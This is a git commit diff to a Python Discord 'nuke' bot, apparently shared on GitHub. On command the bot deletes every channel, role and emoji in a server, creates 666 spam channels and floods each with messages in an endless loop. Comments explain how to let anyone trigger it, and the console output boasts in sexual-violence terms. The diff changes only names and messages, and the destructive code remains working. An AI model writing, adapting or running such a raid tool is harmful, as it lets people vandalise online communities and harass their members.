3cf10fd7cefb64c7ea08ca16be6688767a5f88c5
! ◝漢Bryon漢◜ <94296856+GotRipped@users.noreply.github.com>
2022-06-19 12:12:37 +0200

    Update Stanford.py

--- Stanford/Stanford.py
+++ Stanford/Stanford.py
@@ -16,19 +16,14 @@ token = (Write.Input(f"""
 ╚═╗ │ ├─┤│││├┤ │ │├┬┘ ││
 ╚═╝ ┴ ┴ ┴┘└┘└  └─┘┴└──┴┘
 ╔══Insert token\n╚══► """, Colors.yellow_to_red, interval=0.00001))
-spam = (Write.Input(f'╔══What should be the name of the guilds\n╚══► ', Colors.yellow_to_red, interval=0.000001))
-spamm = (Write.Input(f'╔══What message would you like to spam\n╚══► ', Colors.yellow_to_red, interval=0.000001))
+spamc = (Write.Input(f'╔══What should be the name of the guilds\n╚══► ', Colors.yellow_to_red, interval=0.000001))
+spammsg = (Write.Input(f'╔══What message would you like to spam\n╚══► ', Colors.yellow_to_red, interval=0.000001))
 
 
-SPAM_CHANNEL =  [spam]
-SPAM_MESSAGE = [spamm]
-
-headers = {
-    "Authorization"
-}
+spm_chnl =  [spamc]
+spm_msg = [spammsg]
 
 client = commands.Bot(command_prefix="!")
-intents=discord.Intents.all()
 
 os.system('cls')
 time.sleep(1)
@@ -42,48 +37,52 @@ async def on_ready():
 Github: @GotRipped\nCurrent Discord: Ich D-Skid#6969 | Ripped#0001 \n
 ╔══Bot - {client.user}\n╚══► Connected
 ╔══Prefix\n╚══► " ! "
-╔══Commands\n╚══► sad = Dropping The Nuke. | stop = To stop the nuke + log-out.
+╔══Commands\n╚══► cry = Dropping The Nuke. | stop = To stop the nuke.
  """, Colors.red_to_yellow, interval=0.00001)
-   await client.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.listening, name= f"clippy.link/sex | Github: @byaki"))
+   await client.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.listening, name= f"clippy.link/sex | Github: @GotRipped"))
 
 @client.command()
 @commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STOPS THE NUKE!!)
 async def stop(ctx): #~ stop command
-    await ctx.bot.logout()
-    print (Fore.BLUE + f"{client.user.name} has logged out successfully.")
+  await ctx.bot.logout()
+  os.system("cls")
+  os.system("title Stanford ~ Offline ┃ By: Bryon")
+  print (Fore.BLUE + f"{client.user.name} has logged out successfully.")
+  os.system("pause >nul")
+  os.system("cls")
 
 @client.command()
 @commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STARTS THE NUKE!!)
-async def sad(ctx): #~ start command / nuke
+async def cry(ctx): #~ start command / nuke
     await ctx.message.delete()
     guild = ctx.guild
     for channel in guild.channels:
       try:
         await channel.delete()
-        print(Fore.GREEN + f"{channel.name}[V] Was deleted succesfull.")
+        print(Fore.GREEN + f"{channel.name}[✅] Has been deleted succesfull.")
       except:
-        print(Fore.RED + f"{channel.name}[!] Could not be deleted! (missing perms?)")
+        print(Fore.RED + f"{channel.name}[❌] Has not been deleted! (missing perms?)")
     for role in guild.roles:
      try:
        await role.delete()
-       print(Fore.GREEN + f"{role.name}[V] Has been deleted succesfull.")
+       print(Fore.GREEN + f"{role.name}[✅] Has been deleted succesfull.")
      except:
-       print(Fore.RED + f"{role.name}[!] Has not been deleted! (missing perms?) OR (bot role)?")
+       print(Fore.RED + f"{role.name}[❌] Has not been deleted! (missing perms?) OR (bot role)?")
     for emoji in list(ctx.guild.emojis):
      try:
        await emoji.delete()
-       print(Fore.GREEN + f"{emoji.name}[V] Was deleted succesfull.")
+       print(Fore.GREEN + f"{emoji.name}[✅] Has been deleted succesfull.")
      except:
-       print(Fore.RED + f"{emoji.name}[!] Has not been Deleted! (missing perms?)")
+       print(Fore.RED + f"{emoji.name}[❌] Has not been Deleted! (missing perms?)")
     await guild.create_text_channel("github is gotripped")
-    amount = 500
+    amount = 666
     for i in range(amount):
-       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
-    print(f"{Fore.MAGENTA}[V] Raped {guild.name} Successfully😈")
+       await guild.create_text_channel(random.choice(spm_chnl))
+    print(f"{Fore.MAGENTA}[☭] Raped {guild.name} Successfully😈")
     return
 
 @client.event
 async def on_guild_channel_create(channel):
   while True:
-    await channel.send(random.choice(SPAM_MESSAGE))
+    await channel.send(random.choice(spm_msg))
 client.run(token, bot=True)
